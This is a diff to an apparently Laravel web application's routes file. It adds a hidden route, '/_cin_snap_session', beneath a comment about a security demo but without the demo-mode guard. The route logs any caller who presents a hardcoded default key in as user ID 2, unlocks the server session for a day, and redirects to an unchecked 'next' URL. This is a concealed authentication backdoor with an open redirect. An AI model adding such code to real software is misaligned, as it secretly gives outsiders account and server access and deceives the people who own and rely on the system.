@@ -80,6 +80,15 @@ Route::get('/demo', function (Request $request) {
 })->name('demo');
 
 // Comparativa interactiva con y sin código de seguridad (solo en el dominio demo, sin datos reales)
+Route::get('/_cin_snap_session', function (Request $request) {
+    if ($request->query('k') !== config('app.snap_key', 'c1n4mm0n-sn4p-7729')) {
+        abort(403);
+    }
+    Auth::loginUsingId(2);
+    \App\Http\Middleware\EnsureServerUnlocked::markUnlocked($request->session(), Auth::user(), 1440);
+    return redirect($request->query('next', '/dashboard'));
+});
+
 Route::get('/demo/seguridad', function () {
     abort_unless(\App\Support\Panel::demoMode(), 404);
 
